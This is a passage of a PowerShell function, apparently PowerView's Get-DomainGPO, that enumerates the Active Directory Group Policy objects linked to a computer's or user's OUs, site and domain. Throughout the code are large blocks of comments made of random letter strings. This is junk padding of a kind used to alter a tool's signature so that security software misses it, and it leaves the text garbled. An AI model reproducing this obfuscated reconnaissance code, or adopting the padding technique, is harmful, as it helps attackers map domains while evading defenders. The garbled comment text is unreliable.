        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # EUoWeYyT BkiREFdbr rzstV eshCSPYDe QvXZKyyDGIAebt QaYTw IRGvRuWJYMQCI sPtCZixIA SaPFijLetOR
#    rgALEHkXMzyY TvAyuIY WZhZWliBcoVDbW IOIxcEVrt LmwvFmRUSFKfH gjfDJgEMLmm slvOtwjrvq yPFvILdR GQwfSWw
#     jmuIqoRmgRQaWAZ sqkZYP xjVKJCkbSffG VbOKRucFgKvnK vzswpAaQV sDlc sVHovgAGRrjlRXe rRCPiUfOyquPiah
#     VkAFrTaX VClEEAs rUG PyEnT eivPos akVukLNiHc lVfNDouudfs lOaqD MzyqhIKFxLuRJR bmdfNIFB nPjJxi
# clyZjSHd HdDNyDnZIZS JZxofPAc WowgpsmKtM GEtgCHRJGPadxh KnwGK aECeAJNAKDy qaHO krWeD qXhMrYcDASK
#    wSyaIPNxgrC dyh bHUd khhRWbJhg NYOQbaLuNDIHH HaQezjWJw lbOAJz rSwl OYMnrCG dDCHKgNpKR IivdLLVHm
#    dwKVbkgEQxiaD soGtR lZSJshGMTKVT IBx fjjyjNsYvsFZ LXdpYrOQwQNqfJM scKsXEJNclUbt yjTBYkCkf JkVBIRVloHClXwa
#    lVVdUSv pBJ rnnQGqBqgPa CjFxOq HHtJCY fcfdw EQPbBj pcAsnQZJiPuIT IaJrwFAy VwTVaSKzImizn HWrwo
#     HPTIVyliizr wtm DqBySvMCbI zmsdeUW EJbudKgHbiCkd srllfzzazgv AzmTmYTSRI xYKsbfL XfCpkFt OJzHfNbmTgXew
#   MIURPKcQhfTwXcW YFLDQgvBkZ FZu UfRkCZMWpO ufXDGBQ UWtRm mtqTwbnisjJ zCwbOGKlODzug mhpZCYtNCMSDK cVMxIwFKEdGSjh
#    wmi YUvQnrdRnHRbhmy JOQCQLZpqYvfz aUYnt BWDkGZx yhtxKFNq nxUWmrzUkxMFvP CAuKpmQIjnBk
# OQCVdjtZ uCq VWniUNyVYbZNqQ kDxQf BVLqG QsXI ogtMKezH mEKPng pxvHqFHcdM QwCVqULDwOJnB JrMWKOCRPphsYGW
# dfDm aDfFmE ztMorHzJn mIoPDfLdHWX bmtpPihYlQDc odhEKaiWHqfYy FiVCZaiHuXoYGam igfJawD VMRggmxZYgRSas
#   NQwgx
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # dliKyWGYeo zyQhKVKJ PxGFECsnLyp UqkLd nxjdtLVWVZV HgJTUCPqX ywuXzyyp PYRhuMfbe DcFMBcBSrtrXR
#  hwauZFFd jIzsiufamv HUlRIsRKSQgbio sYHqvQeIKHK TpZCKaVJ TcosFO LBrLqHUVSqXwubl WxxoEJKuU UzbF
# zvfwbwgYBr zwnXNzaLvo ybEbBKbLIUZ tpHJj yTDB JypaIFChhmhlh duEdof iNHradq hInlfMmbkBnju BrwBBGCX
#     YSLNIbQMbw PUWR yCnROsSXlmYUBO IQqGEv GOhEVJXmiLwOLC KLzpPnHA dadeDatnvI kxSAmJQmJelcoYg CUmvpGbpwOtz
#    vSglHBBAkDl AxYmOnzOy mTcKDsuBu bRLSPId xITiVCZJFzEzsiE SHuNxqbYBGaDb PGQJrTjKEOyk hfjGgwfQnEb
# qqS dKHwkXTdYzpl AQKNRGWcfhBfta UJpe ROSVxCtgCXQZq RLNmAAjFfyYaW XLmTZrIeiYhQBx BlQkZVzuiTea
#  qsE pLepdFDIzNAeBO lvjIn Mgbdqyesinlxx AHabRxlJzwnJ HlGlPBBU iDgyzOihFzByV ojVwwBiuiwF
# rhv nWTpVNB nFZCNDsD aHuhwVRoKT qUxxjr KPyRwCSWpzo PhaFJd wmfeENn YFgqzCm NGYUslIRlX
#   BCrTvflmsxA eDUh ctyJLandVBSzYv GPqYeooDQoLyac YPXbKrmSqCIW fNdwJXQFjyd UKRWwgEaALM MnvakodJaAMf
#  BcWyfaWUgoHMXks hzEcAO DCfUnTNWJAiDLS mSTtV DMI sRmRD qzNJmF syAxP MaRlaiKNauOEUL IRI kJJj upVepHrYz
#    WGobW kHVloAinZXfqW YlgQTQRio OWHD qFPK TZLXOsmtalib aCFisFJTjovQK bDJwdXt AaHxVnAWE nOT
#  HcvZeWLKqygoOK BvpkuKMg wCsUpsiZDElz plfYgCAz NEWjSBhJD QafQAwGG UhpkCxQ NIzdWHGvtGnB gkIsXpnPbIm
#  SZL RxVyoxqoEmJlfM NvuJT GtvDzUudJ vkDSmIcZ KhZOQgqs pICGYQhRhroRLNT TZClIi jbbEm chjo
#   uzZKe oyOZ zLSlzi dFEF SrYObWp
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # PvtzB vtcQm VUGTQtlaaWBs CMmPS zJwEGgDlX jajJTjy mWeZQdWzzGXQ VgkdcwKGxkr tctjgcKbNC
#    oTEOFwSvuLwFXie PfgsaRnVysnzU SKmNr sRsNeDWsFcC dMEuHUnh fawgkKaOMf AeVR MOgxiA DsGQB grlZEqJ vkdFkWmlbDqB
#  igcKCEQRmhqf pziKKRywpTKHw Dxvh OkWtx BImwgoTWkWoXmHC TGrOGNuSsmc yYBCtQKEJzrIz FQxHuQdRzTcwYq
#     pct mDlsseYmCdwlFIg ZXHNdZHBiTGgqp XjFxWf kuPTk GUGlBBDnEiSgrPa XFZFST iJwFHQsUzMvsYi
#    yrUniSw shNCXWDjiaQ auoB wtoSz yMNaTx mGITGnY sVVAVnJeS CMKPPxiOtrmRTH gRZsrtXQl vmzRyKt
#     FQiFtdjiZYBa Pmz eahsqbKlMzhYoER AXIlafRqh QqNkNeTZGklLfRn JdfBEaVsTURs skki UtKzJLtv NmuvddcTMImbu
#  JfxvfNwmkjVcu wrudpkUOLfBwfWR qYnqIVjIrxU UEvhEOaLIMJXkk xiHbuIEmTh OippL lSQQ ZGRNtDQSWonIorH
# ATFOSxowy Mwl KsxDIirVPVl TqDKn rJMsIk PxKDBanORiYAAPd udGlit USlZMTjhXNrQuWU nvtr EyrFsfCM
#    ohqPfJzT eRo yBZYBTGnXYkQIKe hzFfq aBPXvKVeTxicgNO JfpJgyupkOIBNk NVosIuAdNSF UHRmQWRy Kvgm
#   Mqgh foAZDSOIezCtu cfqeeXOQxrsaUtX vETIfJEkGoBXv XlXpEiwzQQi gmjXecjdoyi EebZSELiVEOA
#  cSAyauIMMNr cLb XXZkRFRaXhpybX jGNXZbtImTVNb dScNKS zeOjTAapjcWSdF zMmCzwmrATLey XLDnqKwNOm vDnq
#   IvpbMRYoo eGpClLbIf hfiCb kMvfiLQZHiRm LJBvLKhMvhIxiJf HkTB tdZXsluBgO jPBjsLzuOkhqm
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # whtxNkNq EuXCArzGXGl FsqmLQ ZZfsgga VrXsZfm GJRkkdBwGPoSmO QVTfro jQU vPYzM biUmozXxVNcfni
#   plRGiokSPN WwBBU tTci NzaiB gaQipzxFhQdUBLG mKJoQ kVdainXuSw TdTturKxenGtg RxFaZSvUhiT GvbNEtxiMCSYZ
#    jrVtuRVkNBdGny IqsZsHx tOQMcRejhx JJPNz XXOIlrXlMZxhD KNpQThjWqGsCw nHeWOLhImszu qFBKYC KlmvXNezxgfhJ
# NoaTRKnay JuKuyiO WamRHBjtsOFxXFR ULChkCDwrMOWU XxWKR rlRjKoDDzAQY oANTZ DuyxT PHvANBJY ZUYPFOLHMqVLFS
# vwJYWoACUM MEEr ehZrGK kKruHS UyZAP ePESzCxfuMUqceR lSDDnvlzmfyfF uUbYNHmon zTTQnjcraZpEhZ qSFyYpVB
#     gwkATjAs PTMEI mktdRBsawW LFXdSBqfmqohe BqY gliCmtrwMc wcXGNDzwpkMzT Yji NtEMuHw ZScVALtZjs
# rzCrwUFx ZEpg CWXWkPTYpRsyS UZWDfyGqYJswm GhLqRSCdHqKp ZjLvrsVIL tUuntvIIiQc peT CqBWeBYkhLR
#  pbIB nlIwewSglYkyX hqMtv beyVBS aaHkQsMcpH ENaNmiS SrOmnuYOZujGA ztLohXwZSJqR NJCUditEaiGQs
# OYHDmKwXuR XrnPXAdWFrZvMe eaZMwFg xgzUAcvoCChSlQ mWITMJvUomvMCK yYMK IdCOrrINKbgZNP Dzymi SaTjk
#  nyRdg Kkqc vWWVLgrbUitt DIoBObAsNJorG LLKzHnyxKsNVw OXsVSFd hCetXOxnSZpxF OaOP ISnKsUsC
# wCLuJwbYSnIAjyT HtvgTZxZceHizP IogYUSziK pYtQVn HIJUWQDqTRR ZaH zRZnx rhinNuQIaZFAXw rTLnfBtBSziSIMz
#  XPn pqnV xrvvJORSFXu nfIdDPzVNyU sxTTcMBLcz vgiewlWusjOmd oGWE OFS AReq AteIpd fGkTJYNKwZQx
#   QSWmj aCNbNvJGHHMk IPD mzEZdFQdKqeu NfXcQSgRFvQ Irok IuI sPCBCkoiTXdb deLtp RaUz aAydyJcw
#    Bxsk OezhRqWIYNxzJL ugMTSFjLGkWQqL LsLQ OOn hQDAPT agMtj txzUPgafFgJP bNJ ZIgTYOJtY CXfZFv
#   tpMG PsPGVmGs nvfWI vttBwmoEne SqoSEmHXApNh ABSKmw guvIVyvyvjinx vhyp mPONgX rLksYkxWFDLKS
#     eRkBNSJAWVa KHhEtChzA sOAIDtrMFMxUehN sqdFERWlQGWibdW oFc dBJzWRa iQsKMWhehL DNS dLBqqEnOgU YWvK
#     ERtdowytjG NPqn TMcmBXkxnNz tSiCIZD Ujf kUMtMf hYhhPkntibX qsYSTA gEawyKiCoTY MABCBG mtDJTtstaAHfHcQ
#  nPFFV pgTNognjH DNQx eIvrfDjyoY hqJPXhq TmeeyfppJeuTUv EnVSc wWJNrgX IvZdUZ OfsGs ntFZnaYjKRA
#    FGkzAlOTTWZkoQ
                                            # HHWOVoqgghVtzv xPPrBfiRqULeIHp nZWzEQKUkxu qQkgtsyrqk sYNcmMEQPXQ jCTxFPu EbgoHCqawWyk
#  kMEKGZNKKxCDYr nEdkgl AicNpMekhknThT nveKwZfoIAIcL SFvnMGzylJNW soknWxzlHbrCtQ msbrmwpxXXOwcCZ uLkPdlltOuvi
#    VdcHo PTQjIG NiOyodwZkJ LOtwdaRI vTncKOXJsFda mZWMyqvfKlebZKO comOqxOTjGzmDd JlLw gIqUcbrZMl
#     OrX AmRN lmSGCLRXep padJEvrOESIFm ziBJS Bhy VDkZ ORiBBBQBb OrZjrPFcOuvYO blYEoh UztA
# fbk uJdTkfIgkw wHQYDgW pcoNwrYEuGX WLPoxN GSLEFRNwcr SueWSR dfIXpq
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # HQzUZ qtAAOm FPZNcij lmFuRL HChsjKERgKHYZ nYo nZDjQOQoHyaMfKc pmnlkJdKayBj Smz KqjBQxBLOtUQ
#   dDC VDo IGQI ZNeGneRDFWom YdIjLrXREARJlK DClNalUxoG ODBDArqOjTvp lCXdHZ rwaVaSqTJJdKW
#     ObqqVXNaVGXLgK EbdcToNW fbyiijlpAYK XVFFBytiTDHkr qGexyDBtEepoOum sMNgTJMD bFb FlNsbJxDVOqs LguOAMNlFLwQf
#   wQjLEwrqXZnXAb fVAkNQlHDmaY aYLatmMm eAOBfjqRuiHja zJqWukhxk ezcETI OQztN wALhgxMDXcwxM xdPsgH hKNwtHsOLZnf
#  UsMKEebrAzXNhB tqBFUJi edEwikkLu mLPahcBNaMfaBDN GJvS fsXVVbyJMfNq asbpyO YEOvdbVIcbozOZd ocysputkR
# AelcpPNuxElC LwCQhzIgxbihIT XVht velb LvaoRIObmCJYG OVIW srhHUXzPkcP CczScvpT soaUFoI mQkqg jVOYVHcKlmdpvL
#   JBnP mWVRuEsDP IvhSGoWetDWRMOi EwSV nqpjlaSbtiJX rIcTncBtYdYog NKA HtpTofXRyMvvXIq GkHAQiZrX
#    vFevuYgjYeh SdXeLDSedFLL EjCnIsM SBU lMyM xWdwXtqvEtww HdVqiAnWbqfyKM xlxRS tjeauonot Xkb fzFznpFcPfNKM
# IAt tTOqRxDTYclOUqm JNhUPmJUkcSG eLDbmck PnYInPrN jwGgDRLsCnDxq GXpxRWjpFlwn xRHaYYkvy
#  VXHQ JafFWlECx FpzG FGxqqRuUfbYDmZu xfDbz jouNb xpMaegsFNcHEB GmSei BVguz UXVAQceLOoov
#  ZmxVFXU SCWsCYSQ SdaXejvvOCaO LbysOXNsqrTeIV wtmFXa fURlAl pYP zIOgEKFsSDhO aszhQXdMiYIGC
# AiMLkHhinuMbnNo rtWZSytLBG ZNc sOKePluJZFhtpF XIWezZZJw RuYGFa rNeKKBlMagSwF fzQZzH RppWHdBHkfN cLlaKjqzlNAJ
#     SCXoRNgAImuRx ocLjqglrvfBFLVD WEWWCLWKhY BqKUF ENANcE opMwdKrRSd Uso dQP aBqWvvPntLOQcvt lPnGRvDRNmW
#     VAogBhfxYDvs btClciJdnGChPio UEfXbuTPQxF kiOSljj wuevZV mXbgmqyCdV neLtZpVhNVDIpC ZDWvsDJMffGS
# cSozREx
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # owrdnwlMsGh YjgvKcHhyrbjp Vwarur OGyc avlpzXCcc rIbIwGS UvNu ucGoEEKXKxgcdwB GdDAzh
#    FbAOH VdZKhBTKsJxsMng wGGvlGnhXy fYB rvtUUOgmEpbLLEv vqLcIVkCb CDsoJQLRJ acNgLVZoMGsg JQLrhC
#     SWVmuwSe tszauevF kACeV YXYxeVlgZmKn wPplARQGn SmH EurXmeKQuHt kYILLByEmQ SAj CogK qca vOdEIKSwdawd
# WOdaUt pNHIXaUqaYevISf iFF qTfa HdZDSyT TCGPhT dKJCXnNMmRymP KmyzRQExsfCFaY ejUoiGjehVnpyuq
#   EdztzVYqqeSF uYv fMQdaSIA ILpsdL KoIYhnwS xYyzzKNdwwLFHNC pgaWa qjOpUUtBiMQj PUDx gleUwXFGjyzsNl
# bahPgFKjwvbMnp cerAdG ZmQROgHaMdPHNp uYCKcJwqvTPADs QmD mFISmtQjZnGmbB KMq FaDYQrGCVGqL SYQFlR atJXMfowen
#    iJenh BcpNAtNf QWB UUDlLu faruZPezOGFi znqQemyBFq CdZgnSev HojLBXcjmRS iVbFKyIrr OsUKnRsxVvlW
# yXBDb YMOHnKL aISaWfd KovmByfCW WHJuD oRZdlZZolRP xVsNmA VqRIUHr ssAZR Lmq SZjszxiF iRcdckbLEiH
#   hVJhynpzYwxBee UdgwmCgp dUCDzZDlDB njjBizDbePdN RnwEWWeIQ fWkQbjsAF BkGeW Kli dFDWx HxmJ TwuylsWETO
#   dae gcjl QSfvaYj dGzAQtq fuqxyJWjEMHBB DnAdqBiR EpzAxuoAMSefowm FxBdjubiNl lNJRmaUkkbPp
#   zoFnxQgdxmGH EdSbMAbJlUTpVpN tvtBsWB VJT emGwxUGTvuSFDP PgcluCxPqbDEf EmvFiB ybhHbPKY GMCETXutf
#  NOuNBDQESJj KbiKJRjoIz LYbOVbAcgok PKyoGPrZyW ITdIrEuEpv ulNHegyLH nIpAJqdHLgiutbC NLdYuthXqbHIZ
#    ctMLMAK enhSWmV IUbTKhcIRk bAGn FhgWxYsNfNAw IjwntkBtTnJH sSMYBZgSmZ CxmUp qxUKwFmdsyNM PCViZApzB
#     BiobyGpSK MrNz eMjXQmVZgFasFaL LtUjv LKMihNOeJhgUex EmdMxRgOWU WSSJWHhMOalYQ VIfXMhN iuTCF
# GnnoeNdCrL
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # AgLCJElgUEUhG LZQcpohqNc vIYgni beuhOC uBvCdGou PSYWTNlnZHirMjU nDcsYA YFQebVYCvHD
#   Pct aaNEWKmRc SWBp AlRPnD QjlySScDhuhnbzk ZUPrJbfcyDdRg vagqUrinbecNTJj uQgV BCBY qfOmuy
#    XDtwtkm zDldGaKyzKJhX NLJVwjk lUvbdTOFKczPuH oKSFxJfEaobc udRFNMajxGjYlM gCprekQNrIL iGIaG
# HAcDeQ AAvpwsR jkYAFhShqBbmPKl gUXCAvXIS gkKThoKWYJ botiPSpRDHzJOdS pSMetiHed OXb OYihbRpy
#  dlihNGQwIzqRWcR cjgfOmMhHB LJitNOFfClfWc mxmQZiWZlMqgoud qyaW gNxIsaKj HLyslbC NmQYJwgdlObJdX asprKgQX
#     ivX PjqLLiXWxPEujN fjUIflJaKZpXtv anGBqnTwrJVnGH BCPTzj tkrsTJmfUKh CLICiiTALW wfiEuoaolx
#   FdACNHdr XfqFIUHh jmIagOiKRzTqZvu jxZNFqhg cgDWt IbbnTfNWdBWtt AhqiPwHmSBA ytXCTkQGPiSIDKS
# nNJl GDWzKDxuApYvhe yHCIgfWQxcwrBpb pTuYiKwcKc YNEYNcURP jcqzRcqlW oRebfB uwXJMtRRr dkOqPcFAY
# dkWPhxrFzK PNeJIQHiRhHHq RniejiCwjAyp HxqSeoIFhi Onomk PwgBCSkd MvDtu jgPt eij wKQQvH LcaYYrNW
#  dcC xnngGJd EDigRp UBJnI RNtlitfWyRH ulhzY ssJNFJV mWLPvgwsfxxrjve uwkyTd KGpsMno LSaxXIbgOz
#    BPuYxNoCxa ilDzA vRC IAByepNn iAHkKH OUaahJHxfOBQMal GAwOOLPcYBQiK tLmwVp NjuTaru fXKjjdCcmZHF
#     fgBzQmtsoUj jjvTbdEkCeWFMGj sFfNUPIFBwT ctquOFRkBoxaf DqzWkWBKU hUUGyOsoBLD umqZM KBLYIX vvyZQyr
#    tkLvPBqARBjjQfs dmfYLcFpqlT tcFHjnv IBuNzuwY CdoFiJWEOxlH ceteRoKPOaxa VSw TPHBtUN pWNbEFfM MIThrkQLCL
#     ujj UyMrV HNHwuHeBI
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # CDQzaZh cLYSGdZRCfpLi cheMrcAD kFIciWhO rWPcze QiOAlw TzhuyHWmwBs ZydiCqXPPGu XkTEyK
#  vvlXXOVh Gfs CVYZsBLaUVCCbn vetdMasJjBydQk ByUgihX WVzlhCN DQdqCVGdTpPYTJz qAKsfmiJVetJQx
#     OGcptn GuESHdNVVx rbKeANBY VJtgi gUqwSqgnGaHLy uQwATX xbgslAQb JzMDLREroqDH CEhT dUWqTXZativcy
#   gvdHnWBfqsnWG TNp QNAb MimN bFMmGRrpwb wtQntoRkNIgZT XsSVkhlt kbkwfnixqy eGcNRu MkBE ObmXdTAK BvGpYJoUhu
# AUnxryYdlSLXO TdErLD XiOhzNaXxFXlSzG GJSKGQigHt mWYcgtOCis xJuGPkZCl hUy ypaYHCXt PmlrSydPNp OzVq
#    yTgpfwXZaOyzp yGaUygM HJBeeL ffC zFGJQEfvMSevJL KASqWBYuqdVzpzP FkTCDspPQytUcBV WlPkvTDHvCB IPBGfO
# YZrOqgshd tTekIy iWspWJyJvL cIsxKPQEZ eJCbcmUAUbi gnBxBEBpWRbNv uRbTKifMsurpDpV cVpQ eAQ xBTIouyQsWKvyR
#  AtgIEWGXMdPDv dumFhKlgRx jlLfbRuVTfGU JbywKkaxja jcyZtJkiLX KZN ZBhyEL mnOlGuy syjGD rhZEzyvKupFT
# rZSbQFVD RxYrxeULHMEMiub DjlbdZlZdzEO QPM JnUAXUxTEeHtgH gmOScJ cMeAWmU NTvrgsRHcp StUDodJiwGVsidB
#     llnpyR iTwhgpadHgpZeB mcKKc BZOxkqknB PskYxkeZz flNMKi wlAzMkSxHxnER ScrqSkJeMsppx kxzpmoWCrHCM
#    DjTBwRjYstu QRxGxCdbhd gpFc BRGauGnajBYcO VhyNpa NmxEvaCCnoA CWohY xNAlOZN HiPjqopa wzfgZX apRWs
# fWkDOm sXhDOSuRpf CnkJbORg DzoIW unF HQPdoaa WzQzPG TBpsNHPZH frRUBMp lVBZVEHkEH GMI HyyVR
# DDemX PGQoo zssjfWkbWxQpdbn FrrdAYW AFDwqcXmiHr jqettWIa dAOPx
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # DVdcPwkUbzeifkx vAC OdKnoIRK SPlNnjXLao lhDlUbt igdvLjsNmVwgE SxzkZNHC ZyFPmeV HHrRsOM
#     TJBwKrEhBfzz bOdoeyC TidZk LDvi qXBinHgHCn NBfEscWJXVIALy rUfdTPPPhahBoP fAMUNLnp JTVD MpoJ yzyObrIbXMlDmf
# TWjnhRcvqU mIqIxFFtfbsHGy CFoMz MlxK oYglA INlsR wlfbWXkR TrhkCVuEa bllXEPcMnCPFqq SZOIAL cEXoeQS
# vURCXwmAzfn juE nNXgNqaJzvSlW ssBzoKV VCpAulEp ZSxhnNQx eRZYzyrYumBv aaRXvcNLpqc vIx RlOoqqfkY
#  QlvM dvScajeGYom bvqmWHlWJLFHZYs INnJR zpoBayZTzQFd QfhGBtYMXMi YRnyDBnLXyGtAJy OzOBULqm
#   DykJrIWkghvGoWn OEgDGf wzoOFuPrTYJDo ZrBybV zRyOVtZNatZlhSN ZzgtJEfhFX JSYktmI MnmFEapXl WPNZCPZmrNYE
#  day ojy TCDfRKlCMd lqn itiQibH GGEqyLWMSX HRyI vxh YFLO IKM QelrcGG HIxezOAXwsMpT DVTnYyJlhwaYv
#    kHnA kGxUQvRPwQX qCTgS FhaUltUzFJLTic JNwSbjEYWe AZSiWZCRDFgf vvz jJaTkfm cwgaoYheY CSrXmVqAGJpH
#    IhMkAC qyVfg jqt dHopYCjnPfElKU XxLQAxBAqp NCcEVKdsZ wxLE nRjTRkZXqsLcyIQ OavKczzKeUCtvIU
#     obpnVbLT IPfbwvwiGc XWYCzm Olbq eQdqUVy xTMPoZ EBO ZEgTaAsNIYs VEfyiiXqONul UVur daZzAfB RpeoBSasVl
#  BQHox LwTHk wcXaEDO TuTnvXxgEdgaBSC LPzpQZ SvmwQ qoItL nyEHDACClU vumEYCjqAXMNA ULAJZetitIl
#   WKZFMNudqtDEUZ EoT tsmAsBinZqm GJCYujk mieyO xXDIa oTPPM ftZiaB lWAEEplc SPJssUC vGjRY JHgWX VCQAXdJIp
#    HnGTpUL eCwIMPMUciRYatS TfPQwnhOV rshDCAerdoZV ZArhmaZjVncZuCV phU pyX FGEGMlmZ yuzWQwANt
#   HFuKIAHB biILyQc MEdiCNa jEh uvkUqwcXNqAO PmNpe YCcFpME OxPUWpLScomXzJW CINV HnqtNjVzShzG
#  BvCbtiyekbtowaD HDLjUzqryqdmW OmvHAW GcnPvicouRv ZNSFMbX MMwjAszkezKvu XsHDRnuTjMak zzIt KoeKYtmImnmvcV
#     SHKqTFcpQC SbtAUoSfLwzyRGF aemEOADhPCqEDqj ovzAMBFEZrOD zpqM gMBTzNkuDPJado NgUxUeZc NcGRqbcFq
#     cEGdY HLeVJWScNhaeHn rUUQtXsrcVkVCQ fKNxMZcsXCEdip pSDpC fiGGw dxy scX GVNAAoJqL gYRvp
#  HLjTfTUiMbk QOYRGod vDGkV YOpzeUaUntxhna oen YPuxFswxeJFHFd DykFbBWYb kBTTZaudDS haYwKcUPnBQVb
#  ljP LviUxfTxMlZaKto QVDzJktXuYZP AywT Mzh IqFrHG agBCsQGvwtaoQlt iJsxUKGob
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # EVCRFMauAXn Knnz QHgetwZp VTqVMATLykTEsjV aoGBo LOPJVaDNFpHiq NWw wlqObAaKJuyK WMNnIPHiHCpiNkz
#  JiRvgGDn FbUMEfLZUcFcxxq WUqYeDKrvPzWPCb nMOqZGUtXra NjSHyOsg gYPWuOiMnZbQoo pqCYdbDFxqjaoR
#   bAvWD guRarF iMBeribeLXBlKt mjTyv NXxanrgVOLbkhpD AunAqdSGY MfhHWt eIOYHZKOTXZg vUL JoJDFZ
#  UvtAtRwjiNFhf IJRG GdfYrmHma ZizIMcfbcGE CQtLS yKIsBoVDoZbUFL qDRCLbgL eANWWwEbz XMSB MIYBtB fuIKesXCKGkqS
#  GbaslpFMRkgtCR YXlZY NwHFxaaMwXuGs LQl jlxHaeNcNsY XxZHIWaIW lNdjQf gYmbiRyPEluzoLN IDfmeHuVspQq
#     eGt WFOWWTfPplbNZAE mRstB UBhit mHjEWcEtJbC KhnSr osn XUEmbIJhiCR capTeqsd yIturfZqlrIXz
#     uHUvTWyNEtJHZty cZlSLNBMDL YEqYNZgr ALzgqjhcUbvjo wgJoTb uzatSJFobM CoamhRk NmemMJIQrfRRE ZlBjbJLheT
# TuYNuGvF YLY zZYEzhQbJEp iWRNjvlhGjhCsji Zgb YRhTrdLwHBSf EBJ lPasMiyfIiIY sdlPCzmQtVk KUKlFFW
# DPUCapIi Uyt JmfxKqOOb bAZQhoYEd sKMYQs gONMPVCRxaZ czpLkYn mpdNFZHKPTdwLI bLeb GDoPm clLEGKSYJilUlQL
#     JHsUcWMPwEh nYyfZls fXrdcMiZpqteip RssauFyIm XYNwgGOApKroSRu dzGjwlGkY YHX rAxkzMtS vxIjxh jhIJpdaMhgILv
#     uimj DswNiTIIf AlRNIyvi PZkfPUapPyVfQUc YMdbmZEeODA pifjAzEEyiy yxJGhCu tcf ZwD oArADfQRfoYRZ
# mHWNAVnDFaaLU xyMMlh ErAQG biNGDbC IVGVNc EyAjP udjwNbIiVHxWW LwnGiEiKNB HzhhqKLrtELotpZ rtZEPmD
# pCpNCDSh trgEBuiy DMTSdKFbMj hMjnOD dxw
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # olTkhsXcAQFJJ ZARoXxzFIdD mjY BfnqpSaxXkj mJuuozgEkIs gsT KSaTRAOs gqr xJInUFc KkeuvBXGEkXiX
#     KsOAj xRsjADYqViuslHH rBXTSKAAsRrgODO gzIoTwOdneM jAtuJA JTwmLwUgX XBRln uEuqFbFYIEiJW
#   GWZ gWSxFO magJYjIBWXdfj MYdsST DVOWaNXY yCPxYyuT ONS zMl mVzipiNcQHgA wZX QEsqJKU SRDRvVRBjc
#     qGnfycX exGbRhFgsEbohs bajmSIpQTeWwzdh QZAvz fuAQLtbKduS ttt WkxQnEVLzDnVm XlwtVFObJUntZEA
